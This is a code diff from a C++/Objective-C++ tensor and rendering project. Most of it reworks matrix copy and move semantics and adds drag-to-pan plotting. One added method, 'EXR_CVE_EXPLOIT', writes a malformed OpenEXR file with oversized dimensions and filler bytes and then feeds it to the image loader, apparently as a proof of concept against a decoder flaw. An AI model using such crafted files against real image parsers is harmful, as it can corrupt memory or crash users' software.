-                    int offsetA = dotArray(indexA, strides, dims);
-                    int offsetB = dotArray(indexB, other.strides, dims);
-                    buffer[offsetA] = other.buffer[offsetB];
-                }
+
+        
+        
+        // if view then just copy from B to A for Mat[i] = B;
+        if (total_size == other.total_size && ((flags & NON_OWNERSHIP_FLAG) || (other.flags & NON_OWNERSHIP_FLAG))) {
+            // 2. Data Buffer Check (Same Underlying Data)
+            // If both point to the same memory buffer, copying is redundant.
+            if (buffer == other.buffer) {
+            #ifdef CopyLog
+                std::cout << "Ignored redundant self-assignment of views.\n";
+            #endif
                 return *this;
             }
-#ifdef CopyLog
-            std::cout << "Copy Assignment" << "\n";
-#endif
-            memcpy(buffer, other.buffer, total_size * sizeof(Type));
-            memcpy(shape, other.shape, dims * sizeof(size_m));
-            memcpy(strides, other.strides, dims * sizeof(size_m));
-//            gradFunc = other.gradFunc;
-//            parentNodes = other.parentNodes;
             
-            
-        } else {
-#ifdef CopyLog
-            std::cout << "Copy Create Assignment" << "\n";
-#endif
-            if (buffer && !(flags & NON_OWNERSHIP_FLAG)) {
-                delete [] buffer;
+            if (metalBuffer) {
+                copyGPUinplace(*this, other, 0);
+            } else {
+                copyCPUinplace(*this, other, 0);
             }
-            flags = other.flags; // FIX: We are allocating new buffer, so we own it. Reset the ownership flags.
-            flags &= ~NON_OWNERSHIP_FLAG;
-            total_size = other.total_size;
-            buffer = new Type[total_size];
-            buildMetalBuffer();
-            memcpy(buffer, other.buffer, total_size * sizeof(Type));
-            memcpy(shape, other.shape, dims * sizeof(size_m));
-            memcpy(strides, other.strides, dims * sizeof(size_m));
-//            gradFunc = other.gradFunc;
-//            parentNodes = other.parentNodes;
+            return *this;
         }
+        
+        memcpy(shape, other.shape, dims * sizeof(size_m));
+        
+        
+        if (other.refCount) {
+            // =======================================================
+            // PATH A: SHALLOW COPY (View Sharing)
+            // =======================================================
+            memcpy(strides, other.strides, dims * sizeof(size_m));
+            destroyInstance();
+            buffer = other.buffer;
+            metalBuffer = other.metalBuffer;
+            refCount = other.refCount;
+            refCount->fetch_add(1, std::memory_order_relaxed);
+            flags = other.flags;
+            tape = other.tape;
+        } else {
+            // =======================================================
+            // PATH B: DEEP COPY (Exclusive Ownership)
+            // =======================================================
+            flags = other.flags;
+            flags &= ~NON_OWNERSHIP_FLAG;
+            flags &= ~NON_CONTIGUOUS_FLAG;
+            // see if i am not sharing this data with anyone else and recieving from another sorce off same size why allocate again just copy
+            if (!refCount && total_size == other.total_size) {
+                memcpy(strides, other.strides, dims * sizeof(size_m));
+                // DEEP COPY PATH: Standard fallback
+                if (metalBuffer) {
+                    copyGPUinplace(*this, other, 0);
+                } else {
+                    copyCPUinplace(*this, other, 0);
+                }
+                tape = other.tape;
+                return *this;
+            }
+            
+            calcStrides();
+            // Copy Create assignment
+            destroyInstance();
+            total_size = other.total_size;
+            buffer = new Type[other.total_size];
+            buildMetalBuffer();
+            refCount = nullptr;
+            tape = other.tape;
+
+            // Use your efficient CPU copy function
+            copyCPUinplace(*this, other, 0);
+        }
+        
         
         return *this;
     }
@@ -6463,32 +6689,26 @@ public:
             *this = (const MatrixH<dims, Type>&) other;
             return *this;
         }
-//        else if (total_size == other.total_size) {
-//            std::cout << "Copy Assignment" << "\n";
-//            memcpy(buffer, other.buffer, total_size * sizeof(Type));
-//            memcpy(shape, other.shape, dims * sizeof(size_m));
-//        } else {
 #ifdef MoveLog
         std::cout << "Move Assignment" << "\n";
 #endif
-        // WRONGGGGGG
-//        if (buffer && (flags & 0)) {
-//            delete [] buffer;
-//        }
-        if (buffer && !(flags & NON_OWNERSHIP_FLAG)) {
-            delete [] buffer;
-        }
+
+        destroyInstance();
+        
         buffer = other.buffer;
         metalBuffer = other.metalBuffer;
         flags = other.flags;
-        other.buffer = nullptr;
+        refCount = other.refCount;
+        total_size = other.total_size;
+        tape = other.tape;
+        
         memcpy(shape, other.shape, dims * sizeof(size_m));
         memcpy(strides, other.strides, dims * sizeof(size_m));
-        total_size = other.total_size;
-//        gradFunc = std::move(other.gradFunc);
-//        parentNodes = std::move(other.parentNodes);
-//        parentNodes = other.parentNodes; // its a pointer to a vector
-        other.~MatrixH();
+
+        other.refCount = nil;
+        other.buffer = nullptr;
+        other.tape = nil;
+        other.buffer = nil;
         return *this;
     }
     
@@ -10281,7 +10501,10 @@ void updateDottedLine(simd_float3 dir, int count, simd_float4x4* transform) {
 //};
 
 
-
+struct drag_info {
+    simd_float2 event_location;
+    simd_float2 drag_amount;
+};
 
 struct Assets {
     std::vector<std::shared_ptr<GeometryNode<uint16>>> _NodesQueuePtr;
@@ -10324,7 +10547,7 @@ struct Assets {
         std::vector<std::shared_ptr<GeometryNode<uint16>>> _NodesQueuePtr;
         Assets* ass;
         Camera3D cam;
-    
+        std::vector<std::function<bool(drag_info&)>> drag_event_subscribers;
     }
 
 //@property std::vector<Shape<uint16>> objectQueue;
@@ -11090,9 +11313,10 @@ struct Assets {
     BOOL isShift = (event.modifierFlags & NSEventModifierFlagShift) != 0;
     bool onShape = false;
     Renderer *renderer = (Renderer *)self.delegate;
-//    NSPoint mouseLocation = [self convertPoint:[event locationInWindow] fromView:nil];
-//    simd_float2 currentMousePos = simd_make_float2((mouseLocation.x / self.frame.size.width), (mouseLocation.y / self.frame.size.height));
-//    simd_float4 currentMouseDrag = simd_make_float4((deltaX / (float)self.frame.size.width), (-deltaY / (float)self.frame.size.height), 0, 1);
+    
+    NSPoint mouseLocation = [self convertPoint:[event locationInWindow] fromView:nil];
+    simd_float2 currentMousePos = simd_make_float2((mouseLocation.x / self.frame.size.width), (mouseLocation.y / self.frame.size.height));
+    simd_float4 currentMouseDrag = simd_make_float4((deltaX / (float)self.frame.size.width), (-deltaY / (float)self.frame.size.height), 0, 1);
 //    
 //    currentMouseDrag.xyz *= 2;
 //    currentMousePos = 2 * currentMousePos - 1.0f;
@@ -11116,6 +11340,12 @@ struct Assets {
 //        }
 //         
 //    }
+    drag_info drag_charecteristics = {{currentMousePos}, {currentMouseDrag.xy}};
+    for (int i = 0; i < renderer->drag_event_subscribers.size(); i++) {
+        if (renderer->drag_event_subscribers[i](drag_charecteristics)) {
+            return;
+        }
+    }
 
 //    if (!onShape) {
         renderer->cam.handleMouseEvents(deltaX, -deltaY, NO, NO, isShift ? TransformationMode::Translate : TransformationMode::Orbit);
@@ -11546,6 +11776,7 @@ int hand_tracking(cv::Mat& camera_frame, cv::Mat& outMat, float* landmarks, int&
     -(void) iOS_Depth;
     -(void) computational_graph;
     -(void) vec_field;
+- (void) EXR_CVE_EXPLOIT;
 @end
 
 @implementation Intelligence
@@ -11622,31 +11853,239 @@ int hand_tracking(cv::Mat& camera_frame, cv::Mat& outMat, float* landmarks, int&
 }
     
 -(void) computational_graph {
-    auto x = std::make_shared<MatrixH<1, float>>(
-        MatrixH<1, float>::Range(0, {10})
-    );
+//    auto x = std::make_shared<MatrixH<1, float>>(
+//        MatrixH<1, float>::Range(0, {10})
+//    );
+//
+//    auto y = std::make_shared<MatrixH<1, float>>(
+//        MatrixH<1, float>::Range(0, {10})
+//    );
+//    
+//    auto addPrimitive1 = SimmilarPrimitive<1, float>(OpType::ADD, x, y);
+//    
+//    auto result = x->zeros();
+//    result.tape = &addPrimitive1;
+//    result.flags |= COMPUTE_GRAPH;
+//    
+//    auto addPrimitive2 = SimmilarPrimitive<1, float>(OpType::ADD, std::make_shared<MatrixH<1, float>>(result), y);
+//
+//    auto result2 = x->zeros();
+//    result2.tape = &addPrimitive2;
+//    result2.flags |= COMPUTE_GRAPH;
+//    
+//    auto unsqeeze_primitive = UnsqeezePrimitive<1, 2, float>(std::make_shared<MatrixH<1, float>>(result2), 0);
+//    auto result3 = result2.unsqueeze<1>();
+//    result3.tape = &unsqeeze_primitive;
+//    result3.evaluate();
+//    result3.print();
+//
+    matrix image = matrix::zeros({1000, 1000, 4}, dtype::UInt8);
+    CPURasteriser rast;
+//    {
+//        Timer time;
+//        for (int i = 0; i < 100; i++) {
+//            rast.drawLineGG(image, 0, 0, 500, 500, 10, matrix{255, 0, 255, 255});
+//        }
+//    }
+//    {
+//        Timer time;
+//        for (int i = 0; i < 100; i++) {
+//            rast.drawLine(image, 0, 0, 500, 500, 10, matrix{255, 0, 255, 255});
+//        }
+//    }
+//    image.slice({R(100, 500), R(100, 500)}) = matrix{0, 255, 0, 255};
+//    rast.drawStrokedCircle(image, 0.0f, 0.0f, 1.0f, 0.1f, matrix{255, 255, 255, 255});
+//    rast.drawCircle(image, 0.0f, 0.0f, 1.0f-0.1f, matrix{255, 0, 0, 255});
+//    for (int i =0; i < 4; i++) {
+//        float x0 = 0.0f, y0 = 0.0f;
+//        float x1 = 0.5f, y1 = 0.1f;
+//        float x2 = 0.7f, y2 = 0.7f;
+//        float sX = (i < 2) ? 1.0f : -1.0f;
+//        float sY = (i % 2 == 0) ? 1.0f : -1.0f;
+//        rast.drawQuadraticBezier(image, sX*x0, sY*y0, sX*x1, sY*y1, sX*x2, sY*y2, 10, matrix{255u, 0u, 0u, 255u});
+//        rast.drawQuadraticBezier(image, sX*x0, sY*y0, sX*y1, sY*x1 , sX*x2, sY*y2, 10, matrix{255u, 0u, 0u, 255u});
+//
+//    }
+//    rast.drawStrokedPolygonNormalized(image, matrix{{0.0f, 0.0f}, {1.0f, 0.0f}, {0.0f, 1.0f}, {0.4f, 0.4f}}, 2.0f,matrix{0u, 255u, 0u, 255u});
+//    Path2D my_path;
+//    // Standard normalized coordinates `[-1.0, 1.0]`
+//    my_path.moveTo(0.0f, 0.0f);
+//    my_path.lineTo(0.5f, 0.5f);
+//    my_path.quadTo(0.2f, 0.8f, -0.5f, -0.5f);
+//    my_path.close();
+//    // Compile the path into the continuous tensor
+//    my_path.freeze();
+//    // Now you can manipulate `my_path.points` perfectly natively in Matrix ops
+//    // my_path.points = my_path.points * rotation_matrix...
+//    // To render the entire path
+//    rast.drawPathStroked(image, my_path, 2.0f, matrix{0u, 255u, 0u, 255u});
+//    rast.drawPathFilled(image, my_path, matrix{0u, 255u, 0u, 255u});
+    rast.drawText(image, "Hello World", "Helvetica", 64.0f, 500, 500, matrix{255u, 255u, 255u, 255u}, simd_make_float2(0, 0));
+    auto imgH = MatrixH<3, uint8_t>::share_with_matrix(image);
+    imgH.drawText("Hello World", {50, 400}, {255, 255, 255, 255}, 64.0f);
+    
+    std::shared_ptr<Plot> plot = std::make_shared<Plot>();
+    plot->title = "Sine Wave";
+    plot->xAxis.min = 0; plot->xAxis.max = 6.28f;
+    plot->xAxis.tickCount = 6; plot->xAxis.title = "Time (s)";
+    plot->yAxis.min = -1.2f; plot->yAxis.max = 1.2f;
+    plot->yAxis.tickCount = 5; plot->yAxis.title = "Amplitude";
+    // Generate data as matrices
+    matrix xData = matrix::withShape({100}, dtype::Float);
+    matrix yData = matrix::withShape({100}, dtype::Float);
+    float* xp = (float*)xData.buffer;
+    float* yp = (float*)yData.buffer;
+    for (int i = 0; i < 100; i++) {
+        xp[i] = i * 6.28f / 99.0f;
+        yp[i] = sinf(xp[i]);
+    }
+    // Add series — Line, Scatter, or Both
+    plot->addSeries(xData, yData, matrix{0u, 200u, 255u, 255u}, PlotStyle::Line, 2.0f);
+    // Render
+    rast.drawPlot(image, *plot);
+//    image.slice({R(0, 100), R(0, 100), R(3, 4)}) = 255;
+//    image.slice({R(0, 10), R(0, 10), R(0, 1)}) = 255;
+//    image.slice({R(10, 100), R(10, 100), R(2, 3)}) = 255;
+//    image.slice({R(50, 80), R(50, 80)}) = {0, 255, 100, 255};
+    auto text = imgH.ToMTLTexture();
+    pRender->offscreenTexture = text;
+    
+    pRender->drag_event_subscribers.push_back([image, plot, pRender = self->pRender](drag_info drag_char) mutable -> bool {
+        CPURasteriser rast;
+        float Xrange = plot->xAxis.max - plot->xAxis.min;
+        plot->xAxis.min += - Xrange * drag_char.drag_amount.x;
+        plot->xAxis.max += - Xrange * drag_char.drag_amount.x;
+        float Yrange = plot->yAxis.max - plot->yAxis.min;
+        plot->yAxis.min += - Yrange * drag_char.drag_amount.y;
+        plot->yAxis.max += - Yrange * drag_char.drag_amount.y;
+        rast.drawPlot(image, *plot);
+        pRender->offscreenTexture = image.ToMTLTexture();
+        return true;
+    });
 
-    auto y = std::make_shared<MatrixH<1, float>>(
-        MatrixH<1, float>::Range(0, {10})
-    );
+    auto x = MatrixH<1, float>::Range(0, {1200000});
+    auto y = MatrixH<1, float>::Range(0, {1200000});
+    x.flags |= COMPUTE_GRAPH;
+    y.flags |= COMPUTE_GRAPH;
     
-    auto addPrimitive1 = SimmilarPrimitive<1, float>(OpType::ADD, x, y);
+    x.refCount = new std::atomic<uint32>;
+    x.refCount->fetch_add(1);
     
-    auto result = x->zeros();
-    result.tape = &addPrimitive1;
-    result.flags |= COMPUTE_GRAPH;
+    y.refCount = new std::atomic<uint32>;
+    y.refCount->fetch_add(1);
+//    
+//    MTLCaptureManager *captureManager = [MTLCaptureManager sharedCaptureManager];
+//    MTLCaptureDescriptor *captureDescriptor = [[MTLCaptureDescriptor alloc] init];
+//    captureDescriptor.captureObject = GlobalGPUManager.metalDevice;
+//    
+//    NSError *error = nil;
+//    if (![captureManager startCaptureWithDescriptor:captureDescriptor error:&error]) {
+//        NSLog(@"Capture start failed: %@", error);
+//    }
+//    [GlobalGPUManager.gCommandEncoder endEncoding];
+//    GlobalGPUManager.gCommandEncoder = [GlobalGPUManager.gCommandBuffer computeCommandEncoder];
     
-    auto addPrimitive2 = SimmilarPrimitive<1, float>(OpType::ADD, std::make_shared<MatrixH<1, float>>(result), y);
+    {
+        Timer ti;
 
-    auto result2 = x->zeros();
-    result2.tape = &addPrimitive2;
-    result2.flags |= COMPUTE_GRAPH;
+        auto r1 = (x + y) + x + y;
+        r1.evaluate();
+    }
     
-    auto unsqeeze_primitive = UnsqeezePrimitive<1, 2, float>(std::make_shared<MatrixH<1, float>>(result2), 0);
-    auto result3 = result2.unsqueeze<1>();
-    result3.tape = &unsqeeze_primitive;
-    result3.evaluate();
-    result3.print();
+//    [captureManager stopCapture];
+//    r1.print();
+}
+
+- (void) EXR_CVE_EXPLOIT {
+    matrix img = matrix::repeating({1000, 1000}, matrix({(uint8_t)255, (uint8_t)255, (uint8_t)255, (uint8_t)255}));
+    img.save_as_image("/Users/adityadude/Documents/OUTPUT_IMAGES/img1.exr", ImgType::EXR);
+    
+    std::string filename = "/Users/adityadude/Documents/OUTPUT_IMAGES/img1.exr";
+    int width = 1638400;
+    int height = 6553600;
+    auto EXR_MAGIC = 0x01312F76;
+    std::vector<uint8_t> header_bytes;
+    int num_channels = 4;
+    append_raw<uint32_t>(EXR_MAGIC, header_bytes);
+    append_raw<uint32_t>(2, header_bytes);
+
+    auto write_chlist_extended = [](const std::vector<std::tuple<std::string, uint32_t, int32_t, int32_t>>& channels) {
+        std::vector<uint8_t> data;
+        for(const auto& [name, pixel_type, x_sampling, y_sampling] : channels) {
+            write_string(name, data);
+
+            append_raw(pixel_type, data);
+
+            append_raw<uint8_t>(0, data); // pLinear
+
+            append_raw<uint8_t>(0, data);
+            append_raw<uint8_t>(0, data);
+            append_raw<uint8_t>(0, data);
+
+            append_raw(x_sampling, data);
+
+            append_raw(y_sampling, data);
+        }
+
+        append_raw<uint8_t>(0, data);
+        return data;
+    };
+    
+    auto chlist = write_chlist_extended(
+        std::vector<std::tuple<std::string, uint32_t, int32_t, int32_t>>{
+            {"A", 2u, 1, 1},
+            {"B", 2u, 1, 1},
+            {"G", 2u, 1, 1},
+            {"R", 2u, 1, 1},
+        }
+    );
+    write_attr(header_bytes, "channels", "chlist", chlist);
+    std::vector<uint8_t> b0;
+    append_raw<uint8_t>(0, b0);
+    write_attr(header_bytes, "compression", "compression",
+               b0);
+    write_attr(header_bytes, "dataWindow", "box2i",
+               write_box2i_out(0, 0, width - 1, height - 1));
+    write_attr(header_bytes, "displayWindow", "box2i",
+               write_box2i_out(0, 0, 100 - 1, 100 - 1));
+    
+    write_attr(header_bytes, "lineOrder", "lineOrder",
+               append_raw_out<uint8_t>(0));
+    write_attr(header_bytes, "pixelAspectRatio", "float",
+               append_raw_out<float>(1.0));
+    write_attr(header_bytes, "screenWindowCenter", "v2f",
+               write_v2f_out(0.0, 0.0));
+    write_attr(header_bytes, "screenWindowWidth", "float",
+               append_raw_out<float>(1.0));
+    append_raw<uint8_t>(0, header_bytes);
+    auto scanline_size = width * num_channels * 4;
+     
+    std::vector<uint8_t> offsets;
+    auto pixel_data_start = header_bytes.size() + height * 8;
+    for (int y =0; y < height; y++)
+        append_raw<uint64_t>(pixel_data_start, offsets);
+    
+    std::vector<uint8_t> pixel_data;
+    append_raw<int32_t>(0, pixel_data);
+    append_raw<uint32_t>(scanline_size, pixel_data);
+    pixel_data.insert(pixel_data.end(), scanline_size, 0x41);
+    std::ofstream f(filename, std::ios::binary);
+    f.write(reinterpret_cast<const char*>(header_bytes.data()), header_bytes.size());
+    f.write(reinterpret_cast<const char*>(offsets.data()), offsets.size());
+    f.write(reinterpret_cast<const char*>(pixel_data.data()), pixel_data.size());
+//    
+    
+
+    std::cout << header_bytes << "\n";
+    
+
+    
+    CFDictionaryRef header = nullptr;
+    matrix read_img = matrix::fromImage("/Users/adityadude/Documents/OUTPUT_IMAGES/img1.exr", &header);
+    if (header) {
+        NSDictionary *dict = (__bridge_transfer NSDictionary *)header;
+        NSLog(@"%@", dict);
+    }
     
 }
     
@@ -12496,14 +12935,14 @@ int hand_tracking(cv::Mat& camera_frame, cv::Mat& outMat, float* landmarks, int&
 ////            {
 //                std::cout << "For mlx: ";
 //////                Timer time;
-////                    MTLCaptureManager *captureManager = [MTLCaptureManager sharedCaptureManager];
-////                    MTLCaptureDescriptor *captureDescriptor = [[MTLCaptureDescriptor alloc] init];
-////                    captureDescriptor.captureObject = GlobalGPUManager.metalDevice;
-////            
-////                    NSError *error = nil;
-////                    if (![captureManager startCaptureWithDescriptor:captureDescriptor error:&error]) {
-////                        NSLog(@"Capture start failed: %@", error);
-////                    }
+//                    MTLCaptureManager *captureManager = [MTLCaptureManager sharedCaptureManager];
+//                    MTLCaptureDescriptor *captureDescriptor = [[MTLCaptureDescriptor alloc] init];
+//                    captureDescriptor.captureObject = GlobalGPUManager.metalDevice;
+//            
+//                    NSError *error = nil;
+//                    if (![captureManager startCaptureWithDescriptor:captureDescriptor error:&error]) {
+//                        NSLog(@"Capture start failed: %@", error);
+//                    }
 //
 //            
 //            MatrixH<3, uint8_t> matWithAlpha(1080 * 1920 * 4);
@@ -12868,11 +13307,11 @@ int hand_tracking(cv::Mat& camera_frame, cv::Mat& outMat, float* landmarks, int&
     __block auto LineObj = std::make_shared<LineNode>(MatrixH<2, float>::concat(x, x + (-2.0f), 1));
     pRender->_NodesQueuePtr.push_back(LineObj);
     
-    mat A = mat(std::string("A"));
-    mat B = mat(std::string("B"));
-    mat C = A + B * B + A;
-    
-    std::cout << C.MSLCode << std::endl;
+//    mat A = mat(std::string("A"));
+//    mat B = mat(std::string("B"));
+//    mat C = A + B * B + A;
+//    
+//    std::cout << C.MSLCode << std::endl;
 ////    arrowObj.setTailAt(ORIGIN);
 //
     auto k = mlx::core::array({ 0.1, 0.2, 0.3, 0.4, 0.5 });
